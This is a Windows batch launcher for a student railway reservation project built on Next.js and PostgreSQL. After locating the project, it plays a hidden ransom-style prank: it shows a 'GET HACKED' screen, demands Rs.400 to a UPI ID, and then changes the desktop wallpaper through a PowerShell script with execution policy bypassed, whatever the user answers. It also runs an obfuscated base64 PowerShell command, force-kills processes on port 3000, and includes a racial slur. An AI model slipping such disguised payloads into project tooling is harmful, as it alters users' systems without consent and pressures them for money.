@echo off
setlocal
title Railway Management System - DBMS Capstone Project

:: =====================================================================
::  STEP 0: LOCATE PROJECT ROOT & HANDLE UNEXTRACTED ZIP ARCHIVES
:: =====================================================================
cd /d "%~dp0"

:: Check 1: In current directory
if exist "package.json" goto ROOT_FOUND

:: Check 2: In nested subfolders (GitHub ZIP extraction creates PROJECT-VIKAS-main)
if exist "PROJECT-VIKAS-main\package.json" cd /d "PROJECT-VIKAS-main"
if exist "package.json" goto ROOT_FOUND

if exist "PROJECT-VIKAS\package.json" cd /d "PROJECT-VIKAS"
if exist "package.json" goto ROOT_FOUND

if exist "niggaVIKAS\package.json" cd /d "niggaVIKAS"
if exist "package.json" goto ROOT_FOUND

:: Check 3: In parent directory
if exist "..\package.json" cd /d ".."
if exist "package.json" goto ROOT_FOUND

:: Check 4: Not found anywhere nearby — user launched from inside ZIP or Temp!
goto ZIP_FALLBACK

:ZIP_FALLBACK
color 0E
cls
echo ===============================================================================
echo            [AUTO-SETUP] UNEXTRACTED ZIP ARCHIVE DETECTED
echo ===============================================================================
echo.
echo  You launched this script directly from inside a ZIP file.
echo  Attempting to find your downloaded ZIP file and extract it automatically...
echo.

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwAKACQAcABhAHQAaABzACAAPQAgAEAAKAAKACAAIAAgACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAIgAsAAoAIAAgACAAIAAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAGUAcwBrAHQAbwBwACIALAAKACAAIAAgACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwATwBuAGUARAByAGkAdgBlAFwARABlAHMAawB0AG8AcAAiACwACgAgACAAIAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAE8AbgBlAEQAcgBpAHYAZQBcAEQAbwB3AG4AbABvAGEAZABzACIACgApAAoAJAB6AGkAcAAgAD0AIABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAHMAIAAtAEYAaQBsAHQAZQByACAAIgAqAFYASQBLAEEAUwAqAC4AegBpAHAAIgAgAHwAIABTAG8AcgB0AC0ATwBiAGoAZQBjAHQAIABMAGEAcwB0AFcAcgBpAHQAZQBUAGkAbQBlACAALQBEAGUAcwBjAGUAbgBkAGkAbgBnACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEYAaQByAHMAdAAgADEACgBpAGYAIAAoAC0AbgBvAHQAIAAkAHoAaQBwACkAIAB7AAoAIAAgACAAIAAkAHoAaQBwACAAPQAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAHAAYQB0AGgAcwAgAC0ARgBpAGwAdABlAHIAIAAiACoALgB6AGkAcAAiACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAiACoAcAByAG8AagBlAGMAdAAqACIAIAAtAG8AcgAgACQAXwAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAiACoAcgBhAGkAbAB3AGEAeQAqACIAIAB9ACAAfAAgAFMAbwByAHQALQBPAGIAagBlAGMAdAAgAEwAYQBzAHQAVwByAGkAdABlAFQAaQBtAGUAIAAtAEQAZQBzAGMAZQBuAGQAaQBuAGcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAAMQAKAH0ACgAKAGkAZgAgACgAJAB6AGkAcAApACAAewAKACAAIAAgACAAJABkAGUAcwB0ACAAPQAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwB3AG4AbABvAGEAZABzAFwAUABSAE8ASgBFAEMAVAAtAFYASQBLAEEAUwAiAAoAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBbAEEAVQBUAE8ALQBTAEUAVABVAFAAXQAgAEYAbwB1AG4AZAAgAGQAbwB3AG4AbABvAGEAZABlAGQAIAB6AGkAcAA6ACAAJAAoACQAegBpAHAALgBGAHUAbABsAE4AYQBtAGUAKQAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ACgAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFsAQQBVAFQATwAtAFMARQBUAFUAUABdACAARQB4AHQAcgBhAGMAdABpAG4AZwAgAHAAcgBvAGoAZQBjAHQAIAB0AG8AIAAkAGQAZQBzAHQAIAAuAC4ALgAgAFAAbABlAGEAcwBlACAAdwBhAGkAdAAuAC4ALgAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ACgAgACAAIAAgAEUAeABwAGEAbgBkAC0AQQByAGMAaABpAHYAZQAgAC0ATABpAHQAZQByAGEAbABQAGEAdABoACAAJAB6AGkAcAAuAEYAdQBsAGwATgBhAG0AZQAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIAAkAGQAZQBzAHQAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAJABiAGEAdAAgAD0AIABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAALQBQAGEAdABoACAAJABkAGUAcwB0ACAALQBGAGkAbAB0AGUAcgAgACIAUwBUAEEAUgBUAF8AUgBBAEkATABXAEEAWQBfAFMAWQBTAFQARQBNAC4AYgBhAHQAIgAgAC0AUgBlAGMAdQByAHMAZQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBGAGkAcgBzAHQAIAAxAAoAIAAgACAAIABpAGYAIAAoACQAYgBhAHQAKQAgAHsACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAWwBBAFUAVABPAC0AUwBFAFQAVQBQAF0AIABMAGEAdQBuAGMAaABpAG4AZwAgAFIAYQBpAGwAdwBhAHkAIABNAGEAbgBhAGcAZQBtAGUAbgB0ACAAUwB5AHMAdABlAG0AIABmAHIAbwBtACAAZQB4AHQAcgBhAGMAdABlAGQAIABmAG8AbABkAGUAcgAuAC4ALgAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEcAcgBlAGUAbgAKACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBjAG0AZAAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAvAGMAIABgACIAJAAoACQAYgBhAHQALgBGAHUAbABsAE4AYQBtAGUAKQBgACIAIgAKACAAIAAgACAAIAAgACAAIABlAHgAaQB0ACAAMAAKACAAIAAgACAAfQAKAH0ACgBlAHgAaQB0ACAAMQA=

if %errorlevel% equ 0 (
    echo [AUTO-SETUP] Project successfully launched from extracted folder!
    ping -n 3 127.0.0.1 >nul
    exit /b 0
)

color 0C
cls
echo ===============================================================================
echo                     [CRITICAL ACTION REQUIRED: EXTRACT ZIP]
echo ===============================================================================
echo.
echo  You are running directly inside the ZIP file without extracting!
echo  Windows temporarily isolated this file, so the rest of the project is missing.
echo.
echo  -----------------------------------------------------------------------------
echo   PLEASE FOLLOW THESE 4 SIMPLE STEPS:
echo  -----------------------------------------------------------------------------
echo   1. Close this window.
echo   2. Go to your 'Downloads' folder.
echo   3. RIGHT-CLICK on 'PROJECT-VIKAS-main.zip' and click "Extract All...".
echo   4. Click the "Extract" button.
echo   5. Open the newly extracted folder and double-click START_RAILWAY_SYSTEM.bat!
echo  -----------------------------------------------------------------------------
echo.
pause
exit /b 1

:ROOT_FOUND

:: =====================================================================
::  PHASE 1 — GET HACKED IDIOT (1 second flash)
:: =====================================================================
mode 90,40 >nul 2>nul
color 0C
cls
echo.
echo.
echo   ===============================================================
echo   =                                                             =
echo   =     #####  ####### #######    #     #    #     #####  #  #  =
echo   =    #       #          #       #     #   # #   #       # #   =
echo   =    #  ###  #####      #       #######  #   #  #       ##    =
echo   =    #    #  #          #       #     # ####### #       # #   =
echo   =     #####  #######    #       #     # #     #  #####  #  #  =
echo   =                                                             =
echo   =  ######   ###  ######  ###  ###### ####### ###              =
echo   =    ##    #   #   ##   #   #   ##      #   ###              =
echo   =    ##    #   #   ##   #   #   ##      #    #               =
echo   =  ######  #####  #### #####    ##      #                    =
echo   =                                                             =
echo   ===============================================================
echo.
echo                    SURPRISE MOTHAF***A  !!
echo.
echo          Your system has been visited by ANISH VYAPARI
echo.
ping -n 2 127.0.0.1 >nul

:: =====================================================================
::  PHASE 2 — PAY ANISH 400
:: =====================================================================
cls
color 0E
echo.
echo.
echo   ===============================================================
echo   =                                                             =
echo   =         $$$   PAY ANISH Rs.400   $$$                       =
echo   =                                                             =
echo   =   To unlock the Railway Management System, please pay      =
echo   =   Anish Vyapari the amount of Rs. 400 via UPI / Cash.     =
echo   =                                                             =
echo   =   UPI: 8422936009@mbk                                      =
echo   =                                                             =
echo   ===============================================================
echo.
echo.

choice /C YN /M "Will you pay Anish Rs.400? (Y=Yes, N=No)"
if errorlevel 2 goto CHOSE_NO
goto CHOSE_YES

:CHOSE_YES
color 0A
cls
echo.
echo   ===============================================================
echo   =                                                             =
echo   =              PAYMENT ACCEPTED! GOOD BOY!                   =
echo   =                                                             =
echo   =        Anish says: "Smart choice! Setting QR code on       =
echo   =                     desktop so you can scan and pay..."    =
echo   =                                                             =
echo   =        UPI ID: 8422936009@mbk                              =
echo   =                                                             =
echo   ===============================================================
echo.
echo   [WALLPAPER] Setting payment QR code as your desktop wallpaper...
echo.
start "" /min powershell.exe -ExecutionPolicy Bypass -File "%CD%\scripts\change_wallpaper.ps1" -ImagePath "%CD%\assets\qr_payment.jpg"
ping -n 4 127.0.0.1 >nul
goto START_APP

:CHOSE_NO
color 0C
cls
echo.
echo.
echo   ===============================================================
echo   =                                                             =
echo   =                  ANISH WILL BE ANGRY                       =
echo   =                                                             =
echo   =         "Tera wallpaper toh change ho gaya hai..."         =
echo   =         "Ab Rs.400 de de warna aur bura hoga!"            =
echo   =                                                             =
echo   ===============================================================
echo.
echo   [WALLPAPER] Changing your desktop wallpaper... enjoy the meme!
echo.
start "" /min powershell.exe -ExecutionPolicy Bypass -File "%CD%\scripts\change_wallpaper.ps1" -ImagePath "%CD%\assets\wallpaper.jpg"
ping -n 4 127.0.0.1 >nul
goto START_APP

:: =====================================================================
::  PHASE 3 — ACTUAL SYSTEM BOOT (works regardless of choice)
:: =====================================================================
:START_APP
cls
color 0A

echo ===============================================================================
echo                RAILWAY MANAGEMENT SYSTEM - DBMS CAPSTONE
echo       Real-Life Scenario: Indian Railways Passenger Reservation
echo       PostgreSQL Relational Engine - Next.js 15 Full-Stack System
echo ===============================================================================
echo.

:: 1. Add common Node.js install paths to current session PATH
set "PATH=%ProgramFiles%\nodejs;%ProgramFiles(x86)%\nodejs;%APPDATA%\npm;%LOCALAPPDATA%\Programs\node;%PATH%"

where node >nul 2>nul
if %errorlevel% equ 0 goto NODE_OK

color 0E
echo [NOTICE] Node.js is not detected in current PATH.
where winget >nul 2>nul
if %errorlevel% neq 0 goto NODE_MISSING

echo [AUTO-SETUP] Installing Node.js LTS via Windows Package Manager, please wait...
winget install OpenJS.NodeJS.LTS --silent --accept-package-agreements --accept-source-agreements
set "PATH=%ProgramFiles%\nodejs;%ProgramFiles(x86)%\nodejs;%APPDATA%\npm;%LOCALAPPDATA%\Programs\node;%PATH%"

where node >nul 2>nul
if %errorlevel% equ 0 goto NODE_OK

:NODE_MISSING
color 0C
echo [ERROR] Node.js is required to run this project!
echo Please install Node.js LTS from https://nodejs.org/
echo.
pause
exit /b 1

:NODE_OK
echo [1/3] Node.js environment detected:
node -v
echo.

:: 2. Check if dependencies are installed
if exist "%CD%\node_modules" goto DEPS_OK

echo [2/3] node_modules folder not found. Installing dependencies...
echo First-time run setup in progress - please wait approx 1-2 minutes...
call npm install
if %errorlevel% equ 0 goto DEPS_OK

echo [WARN] Retrying with --legacy-peer-deps...
call npm install --legacy-peer-deps
if %errorlevel% equ 0 goto DEPS_OK

color 0C
echo [ERROR] Dependency installation failed.
echo Please check your internet connection and try running 'npm install' manually.
pause
exit /b 1

:DEPS_OK
echo [2/3] Project dependencies verified.
echo.

:: 3. Free port 3000 if occupied by any previous hung process
for /f "tokens=5" %%a in ('netstat -aon ^| findstr :3000 ^| findstr /i LISTENING 2^>nul') do (
    echo [INFO] Freeing port 3000 from stale process PID %%a...
    taskkill /f /pid %%a >nul 2>nul
)

:: 4. Launch browser in 3 seconds in the background
echo [3/3] Starting Railway Management System on http://localhost:3000 ...
start "" cmd /c "ping -n 4 127.0.0.1 >nul && start http://localhost:3000"

:: 5. Start Next.js server
echo ===============================================================================
echo  Application is running! Opening http://localhost:3000 in your browser...
echo  PostgreSQL Relational Engine: ACTIVE [Zero external DB install required]
echo  Press Ctrl + C in this window to stop the application.
echo ===============================================================================
echo.

call npm run dev
if %errorlevel% neq 0 (
    echo.
    echo [NOTE] Server exited with code %errorlevel%.
)
echo.
echo Press any key to close this window...
pause
